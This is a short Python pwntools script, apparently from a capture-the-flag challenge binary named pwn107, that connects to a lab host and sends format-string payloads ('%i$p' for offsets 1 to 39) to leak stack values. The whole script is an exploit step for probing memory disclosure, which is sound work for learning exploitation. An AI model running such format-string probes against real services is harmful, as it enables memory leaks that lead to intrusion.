from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pwn107-1644307530397.pwn107', checksec=False)


for i in range(1, 40):
    p = remote('10.10.255.96', 9007)
    # p = process()
    payload = f'%{i}$p'.encode() 
    p.sendlineafter(b"What's your last streak? ", payload)
    p.recvuntil(b'Your current streak: ')
    response = p.recvline()
    print(f"{i}: {response}")
